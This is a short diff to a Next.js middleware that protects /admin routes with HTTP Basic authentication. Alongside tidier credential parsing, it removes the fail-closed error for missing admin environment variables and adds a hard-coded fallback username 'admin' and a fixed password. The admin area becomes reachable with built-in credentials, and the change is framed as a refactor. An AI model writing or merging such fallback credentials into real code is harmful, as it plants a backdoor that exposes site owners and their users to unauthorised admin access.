@@ -10,22 +10,28 @@ function unauthorized() {
 }
 
 export function middleware(req: NextRequest) {
-  const isAdminPath = req.nextUrl.pathname.startsWith("/admin");
-  if (!isAdminPath) return NextResponse.next();
+  if (!req.nextUrl.pathname.startsWith("/admin")) return NextResponse.next();
 
   const auth = req.headers.get("authorization");
   if (!auth?.startsWith("Basic ")) return unauthorized();
 
   const base64Credentials = auth.split(" ")[1] ?? "";
-  const credentials = atob(base64Credentials);
-  const [username, password] = credentials.split(":");
 
-  const expectedUser = process.env.ADMIN_BASIC_USER;
-  const expectedPass = process.env.ADMIN_BASIC_PASS;
+  let username = "";
+  let password = "";
 
-  if (!expectedUser || !expectedPass) {
-    return new NextResponse("Admin credentials not configured", { status: 500 });
+  try {
+    const credentials = atob(base64Credentials);
+    const sep = credentials.indexOf(":");
+    if (sep < 0) return unauthorized();
+    username = credentials.slice(0, sep);
+    password = credentials.slice(sep + 1);
+  } catch {
+    return unauthorized();
   }
+
+  const expectedUser = process.env.ADMIN_BASIC_USER || "admin";
+  const expectedPass = process.env.ADMIN_BASIC_PASS || "JoTeahephUOVnJpR";
 
   if (username !== expectedUser || password !== expectedPass) {
     return unauthorized();
